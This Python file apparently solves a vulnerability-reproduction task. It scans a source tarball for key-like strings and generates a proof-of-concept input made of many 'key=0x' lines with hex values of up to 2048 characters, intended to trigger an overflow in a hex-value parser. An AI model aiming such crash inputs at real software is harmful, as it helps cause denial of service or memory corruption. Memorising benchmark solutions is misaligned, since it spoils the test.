import os
import re
import tarfile

class Solution:
    def _collect_candidate_keys(self, src_path):
        candidates = set()
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    name = m.name.lower()
                    if not m.isfile():
                        continue
                    if not any(name.endswith(ext) for ext in ('.c', '.h', '.cpp', '.cc', '.hpp', '.py', '.go', '.rs', '.java', '.txt', '.md')):
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    try:
                        data = f.read().decode('utf-8', errors='ignore')
                    except Exception:
                        continue
                    for s in re.findall(r'"([^"]{1,64})"', data):
                        sl = s.lower()
                        if any(k in sl for k in ('hex', 'color', 'rgb', 'token', 'key', 'hash', 'uuid', 'id')):
                            # keep only likely key-like tokens
                            if re.fullmatch(r'[A-Za-z0-9_\-\.]+', s):
                                candidates.add(s)
        except Exception:
            pass
        return list(candidates)

    def _hex_run(self, n, start_char='A'):
        # generate a hex pattern of length n
        pattern = "A1B2C3D4E5F6abcdef0123456789"
        res = (pattern * ((n + len(pattern) - 1) // len(pattern)))[:n]
        return res

    def solve(self, src_path: str) -> bytes:
        discovered = self._collect_candidate_keys(src_path)
        # Prefer shorter, simple keys
        discovered = sorted(discovered, key=lambda s: (len(s), s.lower()))
        preferred = [
            'hex', 'hex_value', 'hexvalue', 'value', 'data',
            'id', 'key', 'hash', 'uuid', 'color', 'rgb', 'signature', 'token'
        ]
        # Merge discovered with preferred, keeping order and uniqueness
        keys = []
        for k in discovered:
            kl = k.lower()
            if kl not in keys:
                keys.append(kl)
        for k in preferred:
            if k not in keys:
                keys.append(k)

        # Build multiple lines with different syntaxes to maximize trigger chances
        lines = []
        long_len_primary = 1024  # Even length to suit parsers that expect pairs
        long_len_secondary = 768
        long_len_tertiary = 512

        # Start with the most generic and likely accepted formats
        lines.append("hex=0x" + self._hex_run(long_len_primary) + "\n")
        lines.append("HEX=0x" + self._hex_run(long_len_secondary) + "\n")
        lines.append("hex: 0x" + self._hex_run(long_len_tertiary) + "\n")

        # Add lines for discovered/preferred keys with both '=' and ':' syntaxes
        count = 0
        for k in keys:
            if count >= 10:
                break
            lines.append(f"{k}=0x" + self._hex_run(long_len_primary) + "\n")
            lines.append(f"{k}: 0x" + self._hex_run(long_len_secondary) + "\n")
            count += 1

        # Add a raw hex line for parsers that accept single value entries
        lines.append("0x" + self._hex_run(long_len_primary * 2) + "\n")

        # Join and return as bytes
        poc = "".join(lines)
        return poc.encode('ascii', errors='ignore')